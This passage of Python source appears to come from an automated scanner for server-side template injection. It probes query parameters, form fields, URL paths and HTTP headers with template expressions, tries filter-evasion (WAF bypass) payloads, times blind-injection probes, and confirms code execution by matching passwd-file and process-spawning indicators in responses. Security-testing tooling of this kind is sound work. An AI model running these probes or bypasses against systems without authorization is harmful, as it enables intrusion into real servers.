            ("gid=", "Linux group id"),
            ("root:", "passwd file"),
            ("www-data:", "web user"),
            ("nobody:", "nobody user"),
            ("Runtime", "Java runtime"),
            ("ProcessBuilder", "Java process"),
            ("subprocess", "Python subprocess"),
            ("Popen", "Python Popen"),
            ("child_process", "Node.js"),
        ]
        
        for payload in rce_payloads[:5]:  # Limit RCE tests
            await rate_limiter.acquire()
            
            try:
                test_url = self._build_test_url(url, param, payload)
                response = await client.get(test_url)
                
                for indicator, desc in rce_indicators:
                    if indicator in response.text:
                        findings.append(Finding(
                            type="ssti",
                            name=f"SSTI Remote Code Execution Confirmed ({engine.name})",
                            severity="CRITICAL",
                            description=f"Remote code execution confirmed via SSTI in {engine.name}. "
                                       f"Attacker can execute arbitrary commands on the server.",
                            host=urlparse(url).netloc,
                            matched_at=url,
                            evidence=[
                                f"Engine: {engine.name}",
                                f"RCE payload: {payload[:100]}...",
                                f"RCE indicator: {indicator} ({desc})",
                            ],
                            cvss_score=10.0,
                            cwe="CWE-94",
                            remediation="CRITICAL: Immediate action required. "
                                       "This vulnerability allows full server compromise. "
                                       "Patch the application immediately.",
                        ).to_dict())
                        return findings  # One RCE confirmation is enough
                        
            except Exception as e:
                logger.debug(f"RCE test error: {e}")
        
        return findings
    
    async def _test_forms_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test form inputs with comprehensive coverage.
        """
        findings = []
        
        await rate_limiter.acquire()
        
        try:
            response = await client.get(url)
            
            # Extract form inputs
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
            select_pattern = r'<select[^>]*name=["\']([^"\']*)["\'][^>]*>'
            
            inputs = re.findall(input_pattern, response.text, re.IGNORECASE)
            textareas = re.findall(textarea_pattern, response.text, re.IGNORECASE)
            selects = re.findall(select_pattern, response.text, re.IGNORECASE)
            
            all_inputs = list(set(inputs + textareas + selects))
            
            for input_name in all_inputs[:15]:
                for detection in POLYGLOT_DETECTION_PAYLOADS[:5]:
                    await rate_limiter.acquire()
                    
                    try:
                        data = {input_name: detection["payload"]}
                        post_resp = await client.post(url, data=data)
                        
                        if detection["expected"] in post_resp.text:
                            if detection["payload"] not in post_resp.text:
                                findings.append(Finding(
                                    type="ssti",
                                    name="SSTI in Form Input",
                                    severity="CRITICAL",
                                    description=f"SSTI via form input '{input_name}'",
                                    host=urlparse(url).netloc,
                                    matched_at=url,
                                    evidence=[
                                        f"Input: {input_name}",
                                        f"Payload: {detection['payload']}",
                                        f"Result: {detection['expected']}",
                                    ],
                                    cvss_score=9.8,
                                    cwe="CWE-94",
                                    remediation="Sanitize all form inputs before template processing.",
                                ).to_dict())
                                break
                                
                    except Exception:
                        continue
                        
        except Exception as e:
            logger.debug(f"Form test error: {e}")
        
        return findings
    
    async def _test_path_injection_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test path-based SSTI with multiple patterns.
        """
        findings = []
        
        # Extended path patterns
        path_patterns = [
            "/page/{{7*7}}",
            "/template/{{7*7}}",
            "/render/{{7*7}}",
            "/view/{{7*7}}",
            "/preview/{{7*7}}",
            "/{{7*7}}",
            "/api/template/{{7*7}}",
            "/content/{{7*7}}",
            "/${7*7}",
            "/{{config}}",
            "/{{self}}",
            "/<%= 7*7 %>",
            "/#{7*7}",
            # URL encoded variants
            "/page/%7b%7b7*7%7d%7d",
            "/template/%24%7b7*7%7d",
        ]
        
        for path in path_patterns:
            await rate_limiter.acquire()
            
            try:
                url = urljoin(base_url, path)
                response = await client.get(url, follow_redirects=True)
                
                # Check for template evaluation
                if "49" in response.text:
                    # Verify it's not just the payload reflected
                    if "{{7*7}}" not in response.text and "${7*7}" not in response.text:
                        findings.append(Finding(
                            type="ssti",
                            name="SSTI in URL Path",
                            severity="CRITICAL",
                            description="URL path is processed by template engine. "
                                       "Route parameters are being evaluated.",
                            host=urlparse(base_url).netloc,
                            matched_at=url,
                            evidence=[
                                f"Vulnerable path: {path}",
                                "Template expression evaluated in URL path",
                            ],
                            cvss_score=9.8,
                            cwe="CWE-94",
                            remediation="Do not use template engines to process URL paths. "
                                       "Use parameterized routes with strict validation.",
                        ).to_dict())
                        break
                        
            except Exception as e:
                logger.debug(f"Path injection test error: {e}")
        
        return findings
    
    async def _test_headers_enterprise(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test HTTP headers for SSTI.
        """
        findings = []
        
        # Extended header tests
        test_headers = [
            ("User-Agent", "{{7*7}}"),
            ("Referer", "{{7*7}}"),
            ("X-Forwarded-For", "{{7*7}}"),
            ("X-Forwarded-Host", "{{7*7}}"),
            ("Accept-Language", "{{7*7}}"),
            ("X-Original-URL", "{{7*7}}"),
            ("X-Custom-Header", "{{7*7}}"),
            ("Cookie", "session={{7*7}}"),
            ("Authorization", "Bearer {{7*7}}"),
            ("Content-Type", "application/{{7*7}}"),
            ("Accept", "text/{{7*7}}"),
            # Alternative syntaxes
            ("User-Agent", "${7*7}"),
            ("User-Agent", "<%= 7*7 %>"),
        ]
        
        for header_name, payload in test_headers:
            await rate_limiter.acquire()
            
            try:
                headers = {header_name: payload}
                response = await client.get(url, headers=headers)
                
                if "49" in response.text:
                    # Verify not reflected as-is
                    if payload not in response.text:
                        findings.append(Finding(
                            type="ssti",
                            name=f"SSTI via HTTP Header ({header_name})",
                            severity="CRITICAL",
                            description=f"Header '{header_name}' is processed by template engine",
                            host=urlparse(url).netloc,
                            matched_at=url,
                            evidence=[
                                f"Vulnerable header: {header_name}",
                                f"Payload: {payload}",
                            ],
                            cvss_score=9.8,
                            cwe="CWE-94",
                            remediation="Never process HTTP headers through template engines. "
                                       "Headers should be validated and sanitized separately.",
                        ).to_dict())
                        break
                        
            except Exception as e:
                logger.debug(f"Header test error: {e}")
        
        return findings
    
    async def _test_waf_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test WAF/filter bypass techniques.
        """
        findings = []
        
        # First check if basic payload is blocked
        await rate_limiter.acquire()
        try:
            test_url = f"{url}?test={{{{7*7}}}}"
            baseline = await client.get(test_url)
            
            # If basic payload works, no need for bypass testing
            if "49" in baseline.text and "{{7*7}}" not in baseline.text:
                return findings
                
        except Exception:
            return findings
        
        # Try bypass techniques
        for bypass in WAF_BYPASS_PAYLOADS[:15]:
            await rate_limiter.acquire()
            
            try:
                bypass_payload = bypass["bypass"]
                test_url = f"{url}?test={quote(bypass_payload)}"
                response = await client.get(test_url)
                
                if "49" in response.text:
                    findings.append(Finding(
                        type="ssti",
                        name=f"SSTI WAF Bypass ({bypass['type']})",
                        severity="HIGH",
                        description=f"WAF/filter bypass successful using {bypass['type']}. "
                                   "Input filtering can be circumvented.",
                        host=urlparse(url).netloc,
                        matched_at=url,
                        evidence=[
                            f"Bypass type: {bypass['type']}",
                            f"Original: {bypass['original']}",
                            f"Bypass payload: {bypass_payload}",
                        ],
                        cvss_score=8.1,
                        cwe="CWE-94",
                        remediation="Implement proper input sanitization at the application level. "
                                   "WAF rules are not sufficient for SSTI prevention.",
                    ).to_dict())
                    break
                    
            except Exception as e:
                logger.debug(f"WAF bypass test error: {e}")
        
        return findings
    
    async def _test_blind_ssti(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test for blind SSTI using time-based detection.
        """
        findings = []
        
        for blind_test in BLIND_SSTI_PAYLOADS[:3]:  # Limit time-based tests
            await rate_limiter.acquire()
            
            try:
                payload = blind_test["payload"]
                expected_delay = blind_test["delay"]
                engine = blind_test["engine"]
                
                test_url = f"{url}?test={quote(payload)}"
                
                start_time = time.time()
                response = await client.get(test_url, timeout=expected_delay + 3)
                elapsed = time.time() - start_time
                
                # Check if response was delayed
                if elapsed >= expected_delay * 0.8:  # Allow 20% tolerance
                    findings.append(Finding(
                        type="ssti",
                        name=f"Blind SSTI Detected ({engine})",
                        severity="HIGH",
                        description=f"Time-based blind SSTI detected. "
                                   f"Template engine appears to be {engine}. "
                                   f"Response delayed by ~{elapsed:.1f}s.",
                        host=urlparse(url).netloc,
                        matched_at=url,
                        evidence=[
                            f"Engine: {engine}",
                            f"Expected delay: {expected_delay}s",
                            f"Actual delay: {elapsed:.1f}s",
                            f"Payload: {payload[:100]}...",
                        ],
                        cvss_score=8.1,
                        cwe="CWE-94",
                        remediation="Investigate and patch the blind SSTI vulnerability. "
                                   "Even without direct output, this can lead to RCE.",
                    ).to_dict())
                    break
                    
            except asyncio.TimeoutError:
                # Timeout might indicate successful sleep
                findings.append(Finding(
                    type="ssti",
                    name=f"Potential Blind SSTI ({blind_test['engine']})",
                    severity="MEDIUM",
                    description="Request timeout may indicate blind SSTI. Manual verification needed.",
                    host=urlparse(url).netloc,
                    matched_at=url,
                    evidence=[f"Request timed out with sleep payload"],
                    cvss_score=6.5,
                    cwe="CWE-94",
                    remediation="Investigate potential blind SSTI vulnerability.",
                ).to_dict())
                
            except Exception as e:
                logger.debug(f"Blind SSTI test error: {e}")
        
        return findings
    
    def _identify_engine(self, response_text: str) -> str | None:
        """Identify the template engine from response (legacy method)."""
        response_lower = response_text.lower()
        
        for engine, signatures in self.ENGINE_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in response_lower:
                    return engine
        
        # Try to identify by behavior
        if "7777777" in response_text:  # {{7*'7'}} result
            return "jinja2"
        
        return None
